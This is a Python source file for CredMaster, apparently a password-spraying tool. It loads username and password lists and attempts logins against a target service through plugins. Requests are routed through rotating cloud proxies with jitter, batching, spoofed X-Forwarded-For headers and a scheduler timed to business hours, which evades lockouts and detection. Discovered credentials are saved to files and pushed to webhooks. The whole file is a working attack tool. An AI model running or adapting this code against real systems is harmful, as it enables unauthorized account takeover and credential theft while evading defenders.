#!/usr/bin/env python3
# from zipfile import *
import threading, queue, argparse, datetime, json, importlib, random, os, time, sys
import utils.utils as utils
import utils.notify as notify
from proxies import providers as proxy_providers

class Logger:
	def __init__(self, outfile):
		self.outfile = outfile
		self.lock = threading.Lock()
		self.lock_userenum = threading.Lock()
		self.lock_success = threading.Lock()
		# input exception handling
		if self.outfile != None:
			of = self.outfile
			if os.path.exists(of):
				self.log_entry(f"File {of} already exists, try again with a unique file name")
				sys.exit()


	def log_entry(self, entry):

		self.lock.acquire()

		ts = datetime.datetime.now(datetime.UTC).strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
		print(f"[{ts}] {entry}")

		if self.outfile is not None:
			with open(self.outfile, 'a+', encoding='utf-8') as file:
				file.write(f"[{ts}] {entry}")
				file.write("\n")
				file.close()

		self.lock.release()


	def log_valid(self, username, plugin):

		self.lock_userenum.acquire()

		with open("credmaster-validusers.txt", 'a+', encoding='utf-8') as file:
			file.write(username)
			file.write('\n')
			file.close()

		self.lock_userenum.release()


	def log_success(self, username, password):

		self.lock_success.acquire()

		with open("credmaster-success.txt", 'a+', encoding='utf-8') as file:
			file.write(username + ":" + password)
			file.write('\n')
			file.close()

		self.lock_success.release()


class CredMaster(object):

	def __init__(self, args, extra_args):

		self.credentials = { "accounts" : [] }

		self.q_spray = queue.Queue()

		self.outfile = None
		self.color = None

		self.start_time = None
		self.end_time = None
		self.time_lapse = None
		self.results = []
		self.cancelled = False

		self.notify_obj = {}

		self.extra_args = extra_args
		self.parse_all_args(args, extra_args)

		self.do_input_error_handling()

		# Utility handling, else run spray
		if self.proxy.should_execute:
			self.Execute(args)

	def get_proxy_provider(self, proxy_provider):
		return proxy_providers.get(proxy_provider)(self.logger)

	def parse_all_args(self, args, extra_args):
		#
		# this function will parse both config files and CLI args
		# If a value is specified in both config and CLI, the CLI value will be preferred
		# Reason: if someone wants to take a standard config from client to client, they can override a value
		#

		self.args = args

		if args.config is not None and not os.path.exists(args.config):
			self.logger.log_entry(f"Config file {args.config} cannot be found")
			sys.exit()

		# assign variables
		# TOO MANY MF VARIABLES THIS HAS GOTTEN OUT OF CONTROL
		# This is fine ;)

		config_dict = {}
		if args.config != None:
			config_dict = json.loads(open(args.config).read())

		self.plugin = args.plugin or config_dict.get("plugin")
		self.outfile = args.outfile or config_dict.get("outfile")
		self.logger = Logger(self.outfile)
		self.proxy = self.get_proxy_provider(args.proxy or config_dict.get("proxy", "fireprox"))
		self.userfile = args.userfile or config_dict.get("userfile")
		self.passwordfile = args.passwordfile or config_dict.get("passwordfile")
		self.userpassfile = args.userpassfile or config_dict.get("userpassfile")
		self.useragentfile = args.useragentfile or config_dict.get("useragentfile")
		self.trim = args.trim or config_dict.get("trim")


		self.thread_count = args.threads or config_dict.get("threads")
		if self.thread_count == None:
			self.thread_count = 1

		self.jitter = args.jitter or config_dict.get("jitter")
		self.jitter_min = args.jitter_min or config_dict.get("jitter_min")
		self.delay = args.delay or config_dict.get("delay")

		self.batch_size = args.batch_size or config_dict.get("batch_size")
		self.batch_delay = args.batch_delay or config_dict.get("batch_delay")
		if self.batch_size != None and self.batch_delay == None:
			self.batch_delay = 1


		self.passwordsperdelay = args.passwordsperdelay or config_dict.get("passwordsperdelay")
		if self.passwordsperdelay == None:
			self.passwordsperdelay = 1

		self.randomize = args.randomize or config_dict.get("randomize")
		self.header = args.header or config_dict.get("header")
		self.xforwardedfor = args.xforwardedfor or config_dict.get("xforwardedfor")
		self.weekdaywarrior = args.weekday_warrior or config_dict.get("weekday_warrior")
		self.color = args.color or config_dict.get("color")

		self.notify_obj = {
			"slack_webhook" : args.slack_webhook or config_dict.get("slack_webhook"),
			"pushover_token" : args.pushover_token or config_dict.get("pushover_token"),
			"pushover_user" : args.pushover_user or config_dict.get("pushover_user"),
			"ntfy_topic" : args.ntfy_topic or config_dict.get("ntfy_topic"),
			"ntfy_host" : args.ntfy_host or config_dict.get("ntfy_host"),
			"ntfy_token" : args.ntfy_token or config_dict.get("ntfy_token"),
			"discord_webhook" : args.discord_webhook or config_dict.get("discord_webhook"),
			"keybase_webhook" : args.keybase_webhook or config_dict.get("keybase_webhook"),
			"teams_webhook" : args.teams_webhook or config_dict.get("teams_webhook"),
			"operator_id" : args.operator_id or config_dict.get("operator_id"),
			"exclude_password" : args.exclude_password or config_dict.get("exclude_password")
		}

		self.pargs = self.proxy.parse_all_args(extra_args, config_dict)


	def do_input_error_handling(self):

		# File handling
		if self.userfile is not None and not os.path.exists(self.userfile):
			self.logger.log_entry(f"Username file {self.userfile} cannot be found")
			sys.exit()

		if self.passwordfile is not None and not os.path.exists(self.passwordfile):
			self.logger.log_entry(f"Password file {self.passwordfile} cannot be found")
			sys.exit()

		if self.userpassfile is not None and not os.path.exists(self.userpassfile):
			self.logger.log_entry(f"User-pass file {self.userpassfile} cannot be found")
			sys.exit()

		if self.useragentfile is not None and not os.path.exists(self.useragentfile):
			self.logger.log_entry(f"Useragent file {self.useragentfile} cannot be found")
			sys.exit()


		# Jitter handling
		if self.jitter_min is not None and self.jitter is None:
			self.logger.log_entry("--jitter flag must be set with --jitter-min flag")
			sys.exit()
		elif self.jitter_min is not None and self.jitter is not None and self.jitter_min >= self.jitter:
			self.logger.log_entry("--jitter flag must be greater than --jitter-min flag")
			sys.exit()

		# Notification Error handlng
		if self.notify_obj["pushover_user"] is not None and self.notify_obj["pushover_token"] is None:
			self.logger.log_entry("pushover_user input requires pushover_token input")
			sys.exit()
		elif self.notify_obj["pushover_user"] is None and self.notify_obj["pushover_token"] is not None:
			self.logger.log_entry("pushover_token input requires pushover_user input")
			sys.exit()

		# Notification Error handlng - ntfy
		if self.notify_obj["ntfy_topic"] is not None and self.notify_obj["ntfy_host"] is None:
			self.logger.log_entry("ntfy_topic input requires ntfy_host input")
			sys.exit()
		elif self.notify_obj["ntfy_topic"] is None and self.notify_obj["ntfy_host"] is not None:
			self.logger.log_entry("ntfy_host input requires ntfy_topic input")
			sys.exit()

		# batch handling
		if self.batch_delay != None and self.batch_size == None:
			self.logger.log_entry("--batch_size flag must be set with --batch_delay flag")
			sys.exit()

		self.proxy.do_input_error_handling()

	def Execute(self, args):

		# Weekday Warrior options
		if self.weekdaywarrior is not None:
			# kill delay & passwords per delay since this is predefined
			self.delay = None
			self.passwordsperdelay = 1

		# parse plugin specific arguments
		pluginargs = {}
		if len(self.pargs) % 2 == 1:
			self.pargs.append(None)
		for i in range(0,len(self.pargs)-1):
			key = self.pargs[i].replace("--","")
			pluginargs[key] = self.pargs[i+1]

		##
		## If any plugins require a special argument, set it here
		##	  Ex: Okta plugin requires the threadcount value for some checking, set it manually
		##
		pluginargs['thread_count'] = self.thread_count

		self.start_time = datetime.datetime.now(datetime.UTC)
		self.logger.log_entry(f"Execution started at: {self.start_time}")

		# Check with plugin to make sure it has the data that it needs
		validator = importlib.import_module(f"plugins.{self.plugin}")
		if getattr(validator,"validate",None) is not None:
			valid, errormsg, pluginargs = validator.validate(pluginargs, self.args)
			if not valid:
				self.logger.log_entry(errormsg)
				return
		else:
			self.logger.log_entry(f"No validate function found for plugin: {self.plugin}")

		self.userenum = False
		if "userenum" in pluginargs and pluginargs["userenum"]:
			self.userenum = True

		# file stuffs
		if self.userpassfile is None and (self.userfile is None or (self.passwordfile is None and not self.userenum)):
			self.logger.log_entry("Please provide plugin & username/password information, or provide API utility options (api_list/api_destroy/clean)")
			sys.exit()

		# batch login
		if self.batch_size:
			self.logger.log_entry(f"Batching requests enabled: {self.batch_size} requests per thread, {self.batch_delay}s of delay between each batch.")


		# Custom header handling
		if self.header is not None:
			self.logger.log_entry(f"Adding custom header \"{self.header}\" to requests")
			head = self.header.split(":")[0].strip()
			val = self.header.split(":")[1].strip()
			pluginargs["custom-headers"] = {head : val}

		if self.xforwardedfor is not None:
			self.logger.log_entry(f"Setting static X-Forwarded-For header to: \"{self.xforwardedfor}\"")
			pluginargs["xforwardedfor"] = self.xforwardedfor

		# this is the original URL, NOT the fireproxy one. Don't use this in your sprays!
		url = pluginargs["url"]

		threads = []

		try:
			# Create lambdas based on thread count
			self.load_apis(url)

			# do test connection / fingerprint
			useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
			connect_success, testconnect_output, pluginargs = validator.testconnect(pluginargs, self.args, self.apis[0], useragent)
			self.logger.log_entry(testconnect_output)

			if not connect_success:
				self.destroy_apis()
				sys.exit()

			# Print stats
			self.display_stats()

			self.logger.log_entry("Starting Spray...")

			count = 0
			time_count = 0
			passwords = ["Password123"]
			if self.userpassfile is None and not self.userenum:
				passwords = self.load_file(self.passwordfile)

			for password in passwords:

				time_count += 1
				if time_count == 1:
					if self.userenum:
						notify.notify_update("Info: Starting Userenum.", self.notify_obj)
					else:
						notify.notify_update(f"Info: Starting Spray.\nPass: {password}", self.notify_obj)

				else:
					notify.notify_update(f"Info: Spray Continuing.\nPass: {password}", self.notify_obj)

				if self.weekdaywarrior is not None:
					spray_days = {
						0 : "Monday",
						1 : "Tuesday",
						2 : "Wednesday",
						3 : "Thursday",
						4 : "Friday",
						5 : "Saturday",
						6 : "Sunday" ,
					}

					self.weekdaywarrior = int(self.weekdaywarrior)
					sleep_time = self.ww_calc_next_spray_delay(self.weekdaywarrior)
					next_time = datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=self.weekdaywarrior) + datetime.timedelta(minutes=sleep_time)
					self.logger.log_entry(f"Weekday Warrior: sleeping {sleep_time} minutes until {next_time.strftime('%H:%M')} on {spray_days[next_time.weekday()]} in UTC {self.weekdaywarrior}")
					time.sleep(sleep_time*60)

				self.load_credentials(password)

				# Start Spray
				threads = []
				for api in self.apis:
					t = threading.Thread(target = self.spray_thread, args = (api, pluginargs) )
					threads.append(t)
					t.start()

				for t in threads:
					t.join()

				count = count + 1

				if self.delay is None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
					if self.userpassfile != None:
						self.logger.log_entry(f"Completed spray with user-pass file {self.userpassfile} at {datetime.datetime.now(datetime.UTC)}")
					elif self.userenum:
						self.logger.log_entry(f"Completed userenum at {datetime.datetime.now(datetime.UTC)}")
					else:
						self.logger.log_entry(f"Completed spray with password {password} at {datetime.datetime.now(datetime.UTC)}")

					notify.notify_update(f"Info: Spray complete.", self.notify_obj)
					continue
				elif count != self.passwordsperdelay:
					self.logger.log_entry(f"Completed spray with password {password} at {datetime.datetime.now(datetime.UTC)}, moving on to next password...")
					continue
				else:
					self.logger.log_entry(f"Completed spray with password {password} at {datetime.datetime.now(datetime.UTC)}, sleeping for {self.delay} minutes before next password spray")
					self.logger.log_entry(f"Valid credentials discovered: {len(self.results)}")
					for success in self.results:
						self.logger.log_entry(f"Valid: {success['username']}:{success['password']}")
					count = 0
					time.sleep(self.delay * 60)

			# Remove AWS resources
			self.destroy_apis()

		except KeyboardInterrupt:
			self.logger.log_entry("KeyboardInterrupt detected, cleaning up APIs")
			try:
				self.logger.log_entry("Finishing active requests")
				self.cancelled = True
				for t in threads:
					t.join()
				self.destroy_apis()
			except KeyboardInterrupt:
				self.logger.log_entry("Second KeyboardInterrupt detected, unable to clean up APIs :( try the --clean option")

		# Capture duration
		self.end_time = datetime.datetime.now(datetime.UTC)
		self.time_lapse = (self.end_time-self.start_time).total_seconds()

		# Print stats
		self.display_stats(False)


	def load_apis(self, url):

		self.logger.log_entry(f"Creating {self.thread_count} Proxies for {url}")

		self.apis = []

		for api in self.proxy.create_apis(self.thread_count, url):
			self.apis.append(api)
			self.logger.log_entry(f"Created API - {api.proxy_url} => {url}")

	def destroy_apis(self):
		for api in self.apis:
			self.proxy.destroy_api(api)

	def display_stats(self, start=True):
		if start:
			self.logger.log_entry(f"Total Proxies: {len(self.apis)}")

		if self.end_time and not start:
			self.logger.log_entry(f"End Time: {self.end_time}")
			self.logger.log_entry(f"Total Execution: {self.time_lapse} seconds")
			self.logger.log_entry(f"Valid credentials identified: {len(self.results)}")

			for cred in self.results:
				self.logger.log_entry(f"VALID - {cred['username']}:{cred['password']}")


	def spray_thread(self, api, pluginargs):

		try:
			self.logger.log_entry(f"plugin_authenticate: {self.plugin}")
			plugin_authenticate = getattr(importlib.import_module(f"plugins.{self.plugin}.{self.plugin}"), f"{self.plugin}_authenticate")
		except Exception as ex:
			self.logger.log_entry("Error: Failed to import plugin with exception")
			self.logger.log_entry(f"Error: {ex}")
			sys.exit()

		count = 0

		while not self.q_spray.empty() and not self.cancelled:

			try:

				if self.batch_size and count != 0:
					if count % self.batch_size == 0:
						time.sleep(self.batch_delay * 60)

				cred = self.q_spray.get_nowait()

				count += 1

				while True:
					if self.jitter is not None:
						if self.jitter_min is None:
							self.jitter_min = 0
						time.sleep(random.randint(self.jitter_min,self.jitter))

					response = plugin_authenticate(api, cred["username"], cred["password"], cred["useragent"], pluginargs)

					# if "debug" in response.keys():
					#	  print(response["debug"])

					if not response["error"]:
						break
					if response["error"]:
						#self.logger.log_entry(f"ERROR in spray_thread: {api.api_key}: {cred['username']} - {response['output']} - {response['debug']}")
						continue


				if response["result"].lower() == "success" and ("userenum" not in pluginargs):
					self.results.append( {"username" : cred["username"], "password" : cred["password"]} )
					notify.notify_success(cred["username"], cred["password"], self.notify_obj)
					self.logger.log_success(cred["username"], cred["password"])

				if response["valid_user"] or response["result"] == "success":
					self.logger.log_valid(cred["username"], self.plugin)

				if self.color:

					if response["result"].lower() == "success":
						self.logger.log_entry(utils.prGreen(f"{api.api_key}: {response['output']}"))

					elif response["result"].lower() == "potential":
						self.logger.log_entry(utils.prYellow(f"{api.api_key}: {response['output']}"))

					elif response["result"].lower() == "failure":
						self.logger.log_entry(utils.prRed(f"{api.api_key}: {response['output']}"))

				else:
					self.logger.log_entry(f"{api.api_key}: {response['output']}")

				self.q_spray.task_done()
			except Exception as ex:
				self.logger.log_entry(f"ERROR: {api.api_key}: {cred['username']} - {ex}")


	def load_credentials(self, password):

		r = ""
		if self.randomize:
			r = ", randomized order"

		users = []
		if self.userenum:
			self.logger.log_entry(f"Loading users and useragents{r}")
			users = self.load_file(self.userfile)
		elif self.userpassfile is None:
			self.logger.log_entry(f"Loading credentials from {self.userfile} with password {password}{r}")
			users = self.load_file(self.userfile)
		else:
			self.logger.log_entry(f"Loading credentials from {self.userpassfile} as user-pass file{r}")
			users = self.load_file(self.userpassfile)


		if self.useragentfile is not None:
			useragents = self.load_file(self.useragentfile)
		else:
			# randomly selected
			useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"]

		while users != []:
			user = None

			if self.randomize:
				user = users.pop(random.randint(0,len(users)-1))
			else:
				user = users.pop(0)

			if self.userpassfile != None:
				password = ":".join(user.split(':')[1:]).strip()
				user = user.split(':')[0].strip()

			if self.trim:
				if any(k['username'] == user for k in self.results):
					#We already found this one
					continue

			cred = {}
			cred["username"] = user
			cred["password"] = password
			cred["useragent"] = random.choice(useragents)

			self.q_spray.put(cred)


	def load_file(self, filename):

		if filename:
			return [line.strip() for line in open(filename, 'r')]


	def ww_calc_next_spray_delay(self, offset):

		spray_times = [8,12,14] # launch sprays at 7AM, 11AM and 3PM

		now = datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=offset)
		hour_cur = int(now.strftime("%H"))
		minutes_cur = int(now.strftime("%M"))
		day_cur = int(now.weekday())

		delay = 0

		# if just after the spray hour, use this time as the start and go
		if hour_cur in spray_times and minutes_cur <= 59:
			delay = 0
			return delay

		next = []

		# if it's Friday and it's after the last spray period
		if (day_cur == 4 and hour_cur > spray_times[2]) or day_cur > 4:
			next = [0,0]
		elif hour_cur > spray_times[2]:
			next = [day_cur+1, 0]
		else:
			for i in range(0,len(spray_times)):
				if spray_times[i] > hour_cur:
					next = [day_cur, i]
					break

		day_next = next[0]
		hour_next = spray_times[next[1]]

		if next == [0,0]:
			day_next = 7

		hd = hour_next - hour_cur
		md = 0 - minutes_cur
		if day_next == day_cur:
			delay = hd*60 + md
		else:
			dd = day_next - day_cur
			delay = dd*24*60 + hd*60 + md

		return delay




if __name__ == '__main__':

	parser = argparse.ArgumentParser()

	basic_args = parser.add_argument_group(title='Basic Inputs')
	basic_args.add_argument('--plugin', help='Spray plugin', default=None, required=False)
	basic_args.add_argument('--proxy', help='Proxy provider', default=None, choices=proxy_providers.keys(), required=False)
	basic_args.add_argument('-u', '--userfile', default=None, required=False, help='Username file')
	basic_args.add_argument('-p', '--passwordfile', default=None, required=False, help='Password file')
	basic_args.add_argument('-f', '--userpassfile', default=None, required=False, help='Username-Password file (one-to-one map, colon separated)')
	basic_args.add_argument('-a', '--useragentfile', default=None, required=False, help='Useragent file')
	basic_args.add_argument('--config', type=str, default=None, help='Configure CredMaster using config file config.json')

	adv_args = parser.add_argument_group(title='Advanced Inputs')
	adv_args.add_argument('-o', '--outfile', default=None, required=False, help='Output file to write contents (omit extension)')
	adv_args.add_argument('-t', '--threads', type=int, default=None, help='Thread count (default 1, max 15)')
	adv_args.add_argument('-j', '--jitter', type=int, default=3, required=False, help='Jitter delay between requests in seconds (applies per-thread)')
	adv_args.add_argument('-m', '--jitter_min', type=int, default=1, required=False, help='Minimum jitter time in seconds, defaults to 0')
	adv_args.add_argument('-d', '--delay', type=int, default=None, required=False, help='Delay between unique passwords, in minutes')
	adv_args.add_argument('--passwordsperdelay', type=int, default=None, required=False, help='Number of passwords to be tested per delay cycle')
	adv_args.add_argument('--batch_size', type=int, default=None, required=False, help='Number of request to perform per thread')
	adv_args.add_argument('--batch_delay', type=int, default=None, required=False, help='Delay between each thread batch, in minutes')
	adv_args.add_argument('-r', '--randomize', default=False, required=False, action="store_true", help='Randomize the input list of usernames to spray (will remain the same password)')
	adv_args.add_argument('--header', default=None, required=False, help='Add a custom header to each request for attribution, specify "X-Header: value"')
	adv_args.add_argument('--xforwardedfor', default=None, required=False, help='Make the X-Forwarded-For header a static IP instead of RNG')
	adv_args.add_argument('--weekday_warrior', default=None, required=False, help="If you don't know what this is don't use it, input is timezone UTC offset")
	adv_args.add_argument('--color', default=False, action="store_true", required=False, help="Output spray results in Green/Yellow/Red colors")
	adv_args.add_argument('--trim', '--remove', action="store_true", help="Remove users with found credentials from future sprays")

	notify_args = parser.add_argument_group(title='Notification Inputs')
	notify_args.add_argument('--slack_webhook', type=str, default=None, help='Webhook link for Slack notifications')
	notify_args.add_argument('--pushover_token', type=str, default=None, help='Token for Pushover notifications')
	notify_args.add_argument('--pushover_user', type=str, default=None, help='User for Pushover notifications')
	notify_args.add_argument('--ntfy_topic', type=str, default=None, help='Topic for Ntfy notifications')
	notify_args.add_argument('--ntfy_host', type=str, default=None, help='Ntfy host for notifications')
	notify_args.add_argument('--ntfy_token', type=str, default=None, help='Ntfy token for private instances')
	notify_args.add_argument('--discord_webhook', type=str, default=None, help='Webhook link for Discord notifications')
	notify_args.add_argument('--teams_webhook', type=str, default=None, help='Webhook link for Teams notifications')
	notify_args.add_argument('--keybase_webhook', type=str, default=None, help='Webhook for Keybase notifications')
	notify_args.add_argument('--operator_id', type=str, default=None, help='Optional Operator ID for notifications')
	notify_args.add_argument('--exclude_password', default=False, action="store_true", help='Exclude discovered password in Notification message')

	args,extra_args = parser.parse_known_args()

	CredMaster(args, extra_args)
